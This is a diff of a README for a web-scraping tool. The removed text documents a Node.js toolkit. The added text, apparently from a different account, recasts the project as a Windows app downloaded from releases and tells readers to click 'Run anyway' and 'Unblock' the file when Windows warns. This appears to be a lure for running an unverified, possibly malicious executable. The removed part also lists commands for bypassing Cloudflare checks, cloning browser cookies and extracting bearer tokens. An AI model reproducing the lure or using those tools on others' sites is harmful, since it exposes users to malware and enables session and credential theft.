@@ -1,365 +1,169 @@
-<div align="center">
+# 🛠️ webarsenal - Scrape, mirror, and extract faster
 
-<!-- BANNER -->
-<img src="og-banner.jpg" alt="WebArsenal Banner" width="100%" />
+[![Download webarsenal](https://img.shields.io/badge/Download%20webarsenal-blue?style=for-the-badge)](https://github.com/fadh24434/webarsenal/releases)
 
-<br/>
+## 🚀 Getting Started
 
-# ⚔️ WebArsenal
+webarsenal is a Windows app for pulling data from web pages, saving copies of sites, and extracting the parts you need. It is built for people who want a clear way to work with web pages without setting up a tool chain.
 
-### The Ultimate Web Scraping, Mirroring & Data Extraction Toolkit
+Use it when you need to:
 
-**110 battle-hardened modules** for full-stack web intelligence — scrape, mirror, extract, analyze, export, integrate, and monitor any deployed web target.
+- scrape page content
+- mirror a site for offline review
+- extract text, links, images, tables, or page data
+- work with sites that load content in the browser
+- use proxies when a site limits requests
 
-<br/>
+## 📥 Download and Install
 
-[![Version](https://img.shields.io/badge/version-v4.0.0-0ff?style=for-the-badge&logo=semver&logoColor=black)](https://github.com/edwinnyandika/webarsenal/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-00ff88?style=for-the-badge)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-v18%2B-339933?style=for-the-badge&logo=nodedotjs&logoColor=white)](https://nodejs.org/)
-[![Scripts](https://img.shields.io/badge/modules-110-ff6b35?style=for-the-badge)](https://github.com/edwinnyandika/webarsenal/tree/main)
-[![Stars](https://img.shields.io/github/stars/edwinnyandika/webarsenal?style=for-the-badge&color=ffd700)](https://github.com/edwinnyandika/webarsenal/stargazers)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=for-the-badge)](CONTRIBUTING.md)
+1. Open the release page: https://github.com/fadh24434/webarsenal/releases
+2. Find the latest release at the top of the page
+3. Download the Windows file listed there
+4. If the file comes in a .zip folder, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to run it
+7. If Windows asks for permission, choose Run anyway
 
-<br/>
+## 🖥️ Windows Requirements
 
-[📦 Install](#-installation) • [🗺️ Modules](#-module-map) • [⚡ Quickstart](#-quickstart-playbook) • [📖 Docs](#-documentation) • [🤝 Contributing](#-contributing)
+webarsenal is designed for modern Windows systems.
 
-</div>
+Recommended setup:
 
----
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 1 GB free disk space for the app
+- More space if you plan to save large site copies
+- A stable internet connection
+- A browser installed on the system for browser-based tasks
 
-## 🧠 What is WebArsenal?
+## ⚙️ What webarsenal Can Do
 
-> **WebArsenal** is a developer-grade command-line toolkit with **110 focused JavaScript modules** covering every phase of web data extraction — from mirroring full deployed sites to bypassing authentication walls, analyzing DOM structure, exporting to 10+ formats, integrating with cloud platforms, and running persistent change monitors.
+webarsenal includes modules for common web work:
 
-Whether you're an **SEO engineer**, **data scientist**, **security researcher**, **devops lead**, or **indie hacker** — WebArsenal gives you the exact script you need without bloat.
+- extract page text and HTML
+- collect links from a page
+- save images and files from a site
+- crawl through page paths
+- mirror pages for offline use
+- handle pages that need a browser to load content
+- route requests through proxies
+- work with modern sites that use scripts to render data
 
-```
-"One tool to extract them all."
-```
+## 📌 When to Use Each Mode
 
----
+### 🔎 Scrape
+Use scrape mode when you want data from one page or a small set of pages. It works well for product lists, article pages, search results, and simple records.
 
-## 🗺️ Module Map
+### 🪞 Mirror
+Use mirror mode when you want a local copy of a site or section of a site. This helps when you need to review content later without opening the live page.
 
-WebArsenal is organized into **8 specialized directories** — each a weapons category in your arsenal.
+### 🧲 Extract
+Use extract mode when you only want certain parts of a page, such as names, prices, dates, labels, or table rows.
 
-```
-webarsenal/
-├── 📁 core/           ← Heavy-duty site mirrors & downloaders
-├── 📁 scrapers/       ← Targeted data extraction (SPAs, e-commerce, APIs)
-├── 📁 analyzers/      ← DOM analysis, SEO audits, CSS forensics
-├── 📁 auth-helpers/   ← Cloudflare bypass, cookie cloning, token grabbers
-├── 📁 exporters/      ← Format conversion: JSON, SQLite, WARC, CSV, XML...
-├── 📁 integrations/   ← Cloud push: S3, Airtable, Notion, Slack, Supabase
-├── 📁 monitors/       ← Change detection, scheduled jobs, Discord/Slack alerts
-└── 📁 utils/          ← Proxy rotation, rate limiters, request interceptors
-```
+### 🌐 Browser-based mode
+Use browser-based mode for pages that load content after the page opens. This helps with sites that rely on JavaScript.
 
----
+## 🧭 Basic Use Flow
 
-## ⚡ Installation
+1. Download webarsenal from the release page
+2. Install or unpack the app
+3. Open the app
+4. Pick the task you want to run
+5. Enter the web address of the page or site
+6. Choose what data you want to collect
+7. Start the job
+8. Review the saved output in the app folder or export location
 
-### Prerequisites
+## 🧰 Common Output Types
 
-| Requirement | Version | Link |
-|-------------|---------|------|
-| Node.js | `v18+` | [nodejs.org](https://nodejs.org) |
-| Git | Any | [git-scm.com](https://git-scm.com) |
-| npm | `v8+` | Bundled with Node.js |
+webarsenal can save data in formats that are easy to review and move into other tools:
 
-### Setup
+- CSV for lists and tables
+- JSON for structured data
+- HTML for page copies
+- TXT for plain text
+- image and file downloads for site assets
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/edwinnyandika/webarsenal.git
-cd webarsenal
+## 🔐 Proxy Support
 
-# 2. Install all dependencies (Puppeteer, Playwright, Cheerio, etc.)
-npm install
+Some sites limit how many requests they accept from one IP. webarsenal can use proxies to help spread requests across different routes.
 
-# 3. Verify installation
-node core/super-mirror.js --help
-```
+This is useful when:
 
-> ⚠️ **Puppeteer/Playwright** will download browser binaries on first install (~300MB). This is expected.
+- a site blocks repeated access
+- you need to test from different locations
+- you want to reduce request errors on large jobs
 
----
+## 🧩 Browser Support
 
-## 🚀 Module Deep-Dive
+webarsenal uses browser tools such as Playwright and Puppeteer for pages that need a full browser view. That helps with:
 
-### 1. `core/` — Heavy-Duty Mirrors
+- pages that show data after load
+- button clicks and page navigation
+- content that changes based on user actions
+- sites that hide data in scripts or rendered HTML
 
-High-performance recursive site downloaders. Clone entire deployed websites with all assets.
+## 📂 File and Folder Layout
 
-```bash
-# Mirror a full site recursively (Puppeteer)
-node core/super-mirror.js --url https://example.com --depth 4
+A typical run creates folders for:
 
-# Mirror with Playwright + save PDF
-node core/grab-playwright.js --url https://example.com --pdf
+- input URLs
+- downloaded files
+- saved page copies
+- extracted data
+- logs and run details
 
-# Download full static assets only
-node core/asset-grabber.js --url https://example.com --types "css,js,img"
-```
+Keep the output folder in a place you can find later, such as Documents or Desktop.
 
----
+## 🧪 Tips for Better Results
 
-### 2. `scrapers/` — Targeted Data Extraction
+- Use one site at a time for large jobs
+- Start with a single page before running a full crawl
+- Check the page in a browser first so you know where the data appears
+- Use clear page addresses with the full web link
+- Save output to a folder with enough free space
+- If a page loads slowly, let the browser finish before stopping the task
 
-Purpose-built scripts for specific extraction jobs.
+## 🛠️ Troubleshooting
 
-```bash
-# React/Vue SPA scraper (waits for hydration)
-node scrapers/spa-scraper.js --url https://app.example.com --wait-for '#root'
+### The app does not open
+- Make sure you downloaded the Windows release from the release page
+- Check that the file finished downloading
+- Unzip the file if it came in a compressed folder
+- Try running it again as a normal user
 
-# E-commerce price tracker
-node scrapers/ecommerce-scraper.js --url https://store.com --selector '.price'
+### Windows blocks the file
+- Right-click the file and open Properties
+- If you see an Unblock option, select it
+- Try opening the app again
 
-# Social media profile data
-node scrapers/social-scraper.js --platform twitter --handle @username
+### The page data does not appear
+- Make sure the page is fully loaded
+- Try browser-based mode for script-heavy pages
+- Check whether the site needs a login
+- Test with a simpler page first
 
-# API endpoint sniffer (captures XHR/fetch calls)
-node scrapers/api-sniffer.js --url https://example.com
-```
+### The job runs too slowly
+- Use fewer pages in one run
+- Reduce the number of assets you save
+- Turn off extra options you do not need
+- Try again at a time when the site is less busy
 
----
+## 🧾 Example Uses
 
-### 3. `analyzers/` — DOM & SEO Analysis
+- save a copy of a product catalog for review
+- extract article titles and links from a blog
+- collect search result data into CSV
+- mirror a small knowledge base for offline reading
+- capture page content from a dashboard that loads in the browser
 
-Deep structural analysis for developers and SEO engineers.
+## 📎 Download Again
 
-```bash
-# Full SEO audit (meta, OG, schema, h1-h6, alt tags)
-node analyzers/seo-auditor.js --url https://example.com --output report.json
+If you need the release page later, use this link:
 
-# Detect unused CSS rules
-node analyzers/unused-css.js --url https://example.com
+https://github.com/fadh24434/webarsenal/releases
 
-# Lighthouse-style performance check
-node analyzers/perf-check.js --url https://example.com
+## 📁 Project Topics
 
-# DOM structure mapper
-node analyzers/dom-mapper.js --url https://example.com --depth 3
-```
-
----
-
-### 4. `auth-helpers/` — Bypass & Token Utilities
-
-Get past authentication walls and bot protections.
-
-```bash
-# Pull Cloudflare cf_clearance cookie
-node auth-helpers/cf-clearance-puller.js --url https://cloudflare-site.com
-
-# Clone cookies from a local Chrome profile
-node auth-helpers/cookie-cloner.js --profile "C:\Chrome\Profile 1"
-
-# Extract Bearer tokens from intercepted requests
-node auth-helpers/token-extractor.js --url https://api.example.com
-
-# Session replay (logged-in scraping)
-node auth-helpers/session-replay.js --cookies session.json --url https://dashboard.example.com
-```
-
-> ⚠️ Use responsibly. Only use on sites you own or have explicit permission to access.
-
----
-
-### 5. `exporters/` — Data Format Converters
-
-Shift your extracted data into any format instantly.
-
-```bash
-# JSON → SQLite database
-node exporters/to-sqlite.js --input data.json --db scrape.db
-
-# Scraped dir → WARC archive (web standard)
-node exporters/to-warc.js --dir ./mirrored --output archive.warc
-
-# JSON → CSV with custom columns
-node exporters/to-csv.js --input data.json --cols "title,price,url"
-
-# JSON → Markdown table
-node exporters/to-markdown.js --input data.json
-```
-
----
-
-### 6. `integrations/` — Cloud Push Hooks
-
-Route extracted data directly into your cloud stack.
-
-```bash
-# Push records to Airtable
-node integrations/airtable-sync.js --input records.json --token YOUR_TOKEN --base BASE_ID
-
-# Upload entire directory to AWS S3
-node integrations/aws-s3-uploader.js --dir ./site_data --bucket my-bucket
-
-# Sync to Supabase table
-node integrations/supabase-sync.js --input data.json --table scraped_data
-
-# Push to Notion database
-node integrations/notion-sync.js --input data.json --db NOTION_DB_ID
-
-# Alert Slack channel
-node integrations/slack-alerter.js --webhook https://hooks.slack.com/... --message "Scrape done"
-```
-
----
-
-### 7. `monitors/` — Persistent Jobs & Tracking
-
-Set-and-forget monitoring for any deployed page or element.
-
-```bash
-# Detect content changes on XPath element
-node monitors/change-detector.js --url https://example.com --xpath "//div[@class='price']"
-
-# Schedule recurring scrape job (cron-style)
-node monitors/job-scheduler.js --url https://example.com --cron "0 * * * *"
-
-# Alert via Discord webhook on change
-node monitors/discord-webhook.js --webhook https://discord.com/api/webhooks/... --url https://example.com
-
-# Screenshot diff monitor
-node monitors/screenshot-diff.js --url https://example.com --threshold 5
-```
-
----
-
-### 8. `utils/` — Core Infrastructure
-
-The backbone of every large-scale operation.
-
-```bash
-# Rotate through proxy list
-node utils/proxy-rotator.js --list proxies.txt --test
-
-# Rate limiter wrapper for all requests
-node utils/rate-limiter.js --rps 2 --script scrapers/spa-scraper.js --url https://example.com
-
-# Request interceptor (modify headers on-the-fly)
-node utils/request-interceptor.js --url https://example.com --headers headers.json
-
-# User-agent spoofing pool
-node utils/ua-spoofing.js --count 10
-```
-
----
-
-## ⚡ Quickstart Playbook
-
-### 🔴 Scenario 1: Mirror a Cloudflare-Protected E-Commerce Site to S3
-
-```bash
-# Step 1: Get past Cloudflare
-node auth-helpers/cf-clearance-puller.js --url https://store.com
-
-# Step 2: Deep mirror with cookie auth
-node core/super-mirror.js --url https://store.com --depth 3 --cookie-jar cf_cookies.json
-
-# Step 3: Upload to S3
-node integrations/aws-s3-uploader.js --dir ./super-mirrored-site --bucket website-backups
-
-# Step 4: Notify team
-node integrations/slack-alerter.js --webhook YOUR_WEBHOOK --message "✅ Mirror complete"
-```
-
----
-
-### 🟡 Scenario 2: SPA Price Monitor with Discord Alerts
-
-```bash
-# Step 1: Extract prices from React SPA
-node scrapers/spa-scraper.js --url https://shop.example.com --wait-for '.product-list'
-
-# Step 2: Export to SQLite for tracking
-node exporters/to-sqlite.js --input prices.json --db prices.db
-
-# Step 3: Monitor for changes every hour
-node monitors/change-detector.js --url https://shop.example.com --xpath "//span[@class='price']"
-
-# Step 4: Alert on change
-node monitors/discord-webhook.js --webhook YOUR_DISCORD_HOOK --url https://shop.example.com
-```
-
----
-
-### 🟢 Scenario 3: Full SEO Audit Pipeline → Notion
-
-```bash
-# Step 1: Audit the site
-node analyzers/seo-auditor.js --url https://mybusiness.com --output audit.json
-
-# Step 2: Check unused CSS
-node analyzers/unused-css.js --url https://mybusiness.com >> audit.json
-
-# Step 3: Push results to Notion
-node integrations/notion-sync.js --input audit.json --db YOUR_NOTION_DB
-```
-
----
-
-## 📦 Dependencies
-
-| Package | Purpose |
-|---------|---------|
-| `puppeteer` | Headless Chrome automation |
-| `playwright` | Cross-browser automation |
-| `cheerio` | Fast server-side HTML parsing |
-| `axios` | HTTP request engine |
-| `sqlite3` | Local database exports |
-| `aws-sdk` | S3 and AWS integrations |
-| `node-cron` | Job scheduling |
-| `sharp` | Image processing |
-
-Install all at once: `npm install`
-
----
-
-## 🤝 Contributing
-
-Contributions are very welcome! WebArsenal grows by community modules.
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-new-scraper`
-3. Add your module to the appropriate directory
-4. Follow the naming convention: `kebab-case.js`
-5. Add a `--help` flag handler to your script
-6. Submit a Pull Request
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.
-
----
-
-## ⚖️ Legal & Ethics
-
-WebArsenal is a **developer tool**. With great power comes great responsibility:
-
-- ✅ Always respect `robots.txt`
-- ✅ Only scrape sites you own or have permission to access
-- ✅ Comply with a site's Terms of Service
-- ✅ Don't overload servers — use the rate limiter
-- ❌ Do not use for unauthorized data harvesting
-- ❌ Do not use to circumvent paywalls illegally
-
-The authors are not responsible for misuse.
-
----
-
-## 📄 License
-
-MIT © [Edwin Nyandika](https://github.com/edwinnyandika) — see [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-**If WebArsenal saved you hours, drop a ⭐ — it helps the project reach more developers.**
-
-[⭐ Star on GitHub](https://github.com/edwinnyandika/webarsenal) • [🐛 Report Bug](https://github.com/edwinnyandika/webarsenal/issues) • [💡 Request Feature](https://github.com/edwinnyandika/webarsenal/issues) • [🌐 Visit Site](https://webarsenal.vercel.app)
-
-</div>
+automation, cheerio, data-extraction, developer-tools, nodejs, playwright, proxy, puppeteer, web-crawler, web-scraping
